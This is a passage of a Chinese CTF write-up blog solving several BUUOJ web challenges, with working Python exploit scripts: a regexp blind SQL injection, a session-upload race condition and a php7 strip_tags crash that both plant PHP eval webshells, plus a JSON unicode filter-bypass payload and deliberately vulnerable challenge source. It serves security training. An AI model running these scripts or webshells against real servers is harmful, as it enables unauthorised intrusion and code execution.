class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最后再file.php输入：<code>?file=phar://upload/0697219c808af1516b30672479cbaae7.jpg</code>，文件名直接在upload文件夹找：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667714010078-8ce3d3ed-392b-4e25-91de-b41d75c4381b.png#averageHue=%23fafaf9&clientId=u90a3b9ac-d06c-4&from=paste&height=231&id=u73f79f75&name=image.png&originHeight=289&originWidth=1630&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40933&status=done&style=none&taskId=u70d00762-b4c1-42fc-8405-1bad1eb7c68&title=&width=1304" alt="image.png"><br>得解</p>
<h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p>考点：SQL注入，%00截断，regexp<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667797631447-24b41ed9-78f9-414f-901d-921617a70809.png#averageHue=%230b8adc&clientId=uf04e0226-0e5f-4&from=paste&height=806&id=ue1b1a840&name=image.png&originHeight=1008&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1706359&status=done&style=none&taskId=u2944e15e-64ad-463c-b975-5fa480a7371&title=&width=1536" alt="image.png"><br>查询语句啥的都告诉你了，fuzz了一遍：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667797650326-d4cb4c1f-057d-4e93-b62b-9d27ab5884d2.png#averageHue=%23faf7f5&clientId=uf04e0226-0e5f-4&from=paste&height=298&id=ua7b6bbd8&name=image.png&originHeight=373&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31270&status=done&style=none&taskId=ue737a4a1-8dcd-4774-9ca2-64d1c1c1d36&title=&width=876.8" alt="image.png"><br>能用的东西少得可怜，<code>or,and,单引号,#,-</code>全没了，其实除了单引号其他的都无所谓，但是单引号没了就很难受了啊，or没了可以用<code>||</code>绕过，然后注释符也没了，想不出的我就去看了下wp<br>首先他有个robots.txt:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667797712660-0af29404-72dc-4b5f-a3de-5a9a97898b2e.png#averageHue=%23fcfcfb&clientId=uf04e0226-0e5f-4&from=paste&height=226&id=u2af8e7e3&name=image.png&originHeight=283&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23629&status=done&style=none&taskId=ud74d00f5-e1f3-48ca-9f84-905ce81ec12&title=&width=1536" alt="image.png"><br>这个给不给说实话无所谓，然后wp里用的骚方法是%00截断<code>;%00</code>:</p>
<blockquote>
<p>%00注释<br>符号并非MySQL的注释符，但PHP具有%00截断的漏洞，有些函数会把%00当做结束符，也就起到了注释掉后面代码的作用。 （比如文件上传中的00截断漏洞）另外在Python脚本中的使用：Python访问浏览器，会进行一次URL编码， 因此参数中的URL编码在服务端并不会解码，#等可打印字符直接在参数中输入字符即可，但不可打印字符如%00就需要进行格式处理。</p>
</blockquote>
<p>比如我输入<code>username=\,password=||1&#39;%00</code>,在burp里输入，在登录框输入%00不会识别：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667797834002-0aa981a5-6b69-45e6-a213-a00567d9165a.png#averageHue=%23f8f7f7&clientId=uf04e0226-0e5f-4&from=paste&height=486&id=u557fea1c&name=image.png&originHeight=607&originWidth=1487&originalType=binary&ratio=1&rotation=0&showTitle=false&size=123508&status=done&style=none&taskId=udfefd4b0-98b3-431a-a49f-3b670813b6e&title=&width=1189.6" alt="image.png"><br>成功之后会有302跳转，这边就可以进行一个regexp盲注，脚本我就放出来了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:Boogipop</span></span><br><span class="line">import requests</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line"><span class="keyword">from</span> urllib import parse</span><br><span class="line"><span class="keyword">from</span> time import sleep</span><br><span class="line">dict=<span class="keyword">string</span>.ascii_lowercase+<span class="keyword">string</span>.digits+<span class="string">&quot;_&#123;&#125;&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://f03556c3-0292-463f-9c11-4e4dcdf7a8d5.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">result=<span class="string">&quot;you_will_never_know7788990&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j in dict:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>:f<span class="string">&quot;||passwd/**/regexp/**/\&quot;^&#123;result+j&#125;\&quot;/**/;&#123;parse.unquote(&#x27;%00&#x27;)&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.<span class="title function_ invoke__">post</span>(url=url,data=data)</span><br><span class="line">        <span class="comment"># sleep(0.1)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;welcome&quot;</span> in r.text:</span><br><span class="line">            result+=j</span><br><span class="line">            <span class="keyword">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>之后跑出密码是<code>you_will_never_know7788990</code><br>最后由于admin被ban了，加密为hex之后绕过<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667797904810-9eb46f67-8566-4309-a747-26a39113a06d.png#averageHue=%230c8adc&clientId=uf04e0226-0e5f-4&from=paste&height=818&id=u7a8f45db&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1709827&status=done&style=none&taskId=u6eca8a2b-b5aa-4351-a7ad-b067ab8c568&title=&width=1536" alt="image.png"><br>DOne</p>
<h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>考点:SSTI低水平题<br>没啥好说的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667882090202-c81f8b48-9580-48b5-a982-a20fc05e7688.png#averageHue=%23f7f8f8&clientId=u9158e494-ca10-4&from=paste&height=296&id=ub3452bbc&name=image.png&originHeight=370&originWidth=1634&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35802&status=done&style=none&taskId=u6ddc8343-7a7d-4775-9c4f-b545f2168cb&title=&width=1307.2" alt="image.png"><br>难点就在猜那个传参点</p>
<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>考点:缓存文件包含或条件竞争<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669032540062-0e886646-4844-4359-87c3-e23beaef8938.png#averageHue=%23f8f8f8&clientId=u1a506825-9f9f-4&from=paste&height=91&id=ube160965&name=image.png&originHeight=114&originWidth=971&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3656&status=done&style=none&taskId=ufaef628c-32ef-4fce-81ba-c5af8cfb32d&title=&width=776.8" alt="image.png"><br>源代码内发现了可疑的地方，抓个包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669032568052-38ce9452-f88b-468b-88c8-4850d8dc79ae.png#averageHue=%23f7f6f6&clientId=u1a506825-9f9f-4&from=paste&height=259&id=uf74cd42d&name=image.png&originHeight=324&originWidth=1265&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53048&status=done&style=none&taskId=u83ab272d-1628-4ca9-8406-986ca97b020&title=&width=1012" alt="image.png"><br>发现返还个hash，说不定是密码输入试试：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669032618601-3b671561-ba3c-4377-b28e-2e9453ea5452.png#averageHue=%23f7f6f6&clientId=u1a506825-9f9f-4&from=paste&height=290&id=uc01432ac&name=image.png&originHeight=363&originWidth=1271&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60494&status=done&style=none&taskId=u7e82419f-9942-4ecd-95ef-fb8e2666f00&title=&width=1016.8" alt="image.png"><br>跳转到了这里，我们访问一下看看：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669032666833-61ad2276-a05b-49e0-885c-06795da849e8.png#averageHue=%23f8f8f8&clientId=u1a506825-9f9f-4&from=paste&height=338&id=uac95bf89&name=image.png&originHeight=423&originWidth=1219&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57661&status=done&style=none&taskId=uc8e5d999-81db-4bb8-b19e-46784046c2d&title=&width=975.2" alt="image.png"><br>看到了个include文件包含，我的第一反应是条件竞争：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:Boogipop</span></span><br><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line">import threading</span><br><span class="line">url=<span class="string">&#x27;http://2858ca7f-3f90-4f39-a74f-fd80992d2576.node4.buuoj.cn:81/&#x27;</span> <span class="comment">#引入url</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span> <span class="comment">#PHPSESSID的值</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/3.php&#x27;,&#x27;&lt;?php eval(<span class="subst">$_POST</span>[2]);?&gt;&#x27;);&quot;</span> <span class="comment">#将木马写入1.php</span></span><br><span class="line">    &#125;</span><br><span class="line">def <span class="title function_ invoke__">write</span>(session):</span><br><span class="line">    fileBytes=io.<span class="title function_ invoke__">BytesIO</span>(b<span class="string">&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>) <span class="comment">#上传一个50k的文件</span></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        r=requests.<span class="title function_ invoke__">get</span>(url=url)</span><br><span class="line">        <span class="comment"># print(r.cookies)</span></span><br><span class="line">        response=requests.<span class="title function_ invoke__">post</span>(url+<span class="string">&quot;flflflflag.php&quot;</span>,data=&#123;</span><br><span class="line">            <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span> #将这段代码写入session文件中</span><br><span class="line">        &#125;,</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid #同上，PHPSESSID的值</span><br><span class="line">        &#125;,</span><br><span class="line">         files=&#123;</span><br><span class="line">             <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes) </span><br><span class="line">         &#125;</span><br><span class="line">         )</span><br><span class="line">def <span class="title function_ invoke__">read</span>(session):</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        requests.<span class="title function_ invoke__">get</span>(url=url)</span><br><span class="line">        response=session.<span class="title function_ invoke__">post</span>(url+<span class="string">&#x27;flflflflag.php?file=/tmp/sess_&#x27;</span>+sessionid,data=data,cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid      #包含session文件让第一个<span class="keyword">eval</span>执行，然后执行第二个<span class="keyword">eval</span></span><br><span class="line">        &#125;)</span><br><span class="line">        response2=session.<span class="title function_ invoke__">get</span>(url+<span class="string">&#x27;3.php&#x27;</span>) <span class="comment">#获得回显</span></span><br><span class="line">        <span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;++++++perfect+++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(response2.status_code)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        evnet=threading.<span class="title function_ invoke__">Event</span>()       <span class="comment">#开启线程</span></span><br><span class="line">        with requests.<span class="title function_ invoke__">session</span>() <span class="keyword">as</span> session:        <span class="comment">#多线程操作</span></span><br><span class="line">            <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">10</span>):</span><br><span class="line">                threading.<span class="title function_ invoke__">Thread</span>(target=write,args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line">            <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">10</span>):</span><br><span class="line">                threading.<span class="title function_ invoke__">Thread</span>(target=read, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line">        evnet.<span class="title function_ invoke__">set</span>()           <span class="comment">#将信号标志设置为True，并唤醒所有处于等待状态的线程。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后把shell写入，在phpinfo可以发现flag，当时我还在想ban了什么system要绕过disabled_function，虽然用UAF确实可以绕过</p>
<p>然后网上搜了下WP发现了一个新的方法：<br>php7.0的bug：<br><code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code><br>使用php:&#x2F;&#x2F;filter&#x2F;string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。<br>该方法仅适用于以下php7版本，php5并不存在该崩溃。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• php7.<span class="number">0.0</span>-<span class="number">7.1</span>.<span class="number">2</span>可以利用， <span class="number">7.1</span>.<span class="number">2</span>x版本的已被修复</span><br><span class="line"></span><br><span class="line">• php7.<span class="number">1.3</span>-<span class="number">7.2</span>.<span class="number">1</span>可以利用， <span class="number">7.2</span>.<span class="number">1</span>x版本的已被修复</span><br><span class="line"></span><br><span class="line">• php7.<span class="number">2.2</span>-<span class="number">7.2</span>.<span class="number">8</span>可以利用， <span class="number">7.2</span>.<span class="number">9</span>一直到<span class="number">7.3</span>到现在的版本已被修复</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">##BytesIO实现了在内存中读写bytes</span></span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[shaw]);?&gt;&quot;</span></span><br><span class="line"><span class="comment">#BytesIO(payload.encode()).getvalue()</span></span><br><span class="line">data=&#123;</span><br><span class="line">   <span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://c707289b-9d30-45b1-8ce7-8c5498df7acd.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fail!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这样就可以去包含tmp目录下的文件，文件就是我们的一句话木马，这个思路不错，但是还有个步骤，上传文件后我们session文件的名字为<code>sess_xxxxxxx</code>这种格式，所以要知道她的名字，我们扫除来了个dir.php,里面的内容就是去查看我们的tmp目录下的文件名的，然后getshell！<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669033061873-982fccdd-4e40-4802-8a65-e9817dd973a3.png#averageHue=%23f9fadb&clientId=u1a506825-9f9f-4&from=paste&height=95&id=ud1937f7f&name=image.png&originHeight=119&originWidth=977&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13556&status=done&style=none&taskId=ub83e5b7f-44c6-4d28-b636-f43219ef286&title=&width=781.6" alt="image.png"><br>看到了文件名就包含：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669033113274-71e0a2c4-213b-4a53-accb-444fa4964df7.png#averageHue=%23f4f4f4&clientId=u1a506825-9f9f-4&from=paste&height=377&id=u7a050e58&name=image.png&originHeight=471&originWidth=1202&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104077&status=done&style=none&taskId=u5bb8e067-b20a-4d73-9ed9-c1d8fd50555&title=&width=961.6" alt="image.png"><br>芜湖！</p>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="HarekazeCTF2019]encode_and_encode"></a>HarekazeCTF2019]encode_and_encode</h2><p>考点：JSON的特殊绕过点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_valid</span>(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$page</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !<span class="title function_ invoke__">is_valid</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span>]);</span><br></pre></td></tr></table></figure>
<p>审了一下不难发现，需要我们post传一个json格式的东西进去（要记得把type也改为json）<br>之后会对我们输出的json数据和json里面的page参数进行一个过滤<br>前两点没问题就获得文件的内容，然后再对文件内容进行一次过滤，最后对flag文件内容进行了一次替换<br>可以看得出来出题人不是一般人，想得到这种套娃的方式，但是看似很困难，实则考的就是一个知识点，json中的unicode编码是会被识别的，比如<code>\u0066\u006c\u0061\u0067</code>就是<code>flag</code>，这样就可以达到绕过的目的<br>绕过这多层判断需要结合<code>filter</code>协议对结果进行base64编码，绕过一下文件的内容，然后再用unicode去绕过我们的payload本身，所以最终的payload<code> &#123;&quot;page&quot;:&quot;\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067&quot;&#125;</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669094325824-eee46b20-f04d-4bb9-b1d6-9b188955ae94.png#averageHue=%23e2b76d&clientId=uad167d7e-71dd-4&from=paste&height=70&id=u8a18f52c&name=image.png&originHeight=87&originWidth=785&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6506&status=done&style=none&taskId=uf1515748-0d9d-4617-abd2-d1f7d03ddaa&title=&width=628" alt="image.png"></p>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>考点：htaccess利用，异或rce，代码审计，脚本能力<br>考点都很容易，但是将考点一综合，恐怕就是一道很恐怖的题了，至少我是觉得这题是这样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = <span class="title function_ invoke__">count_chars</span>(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
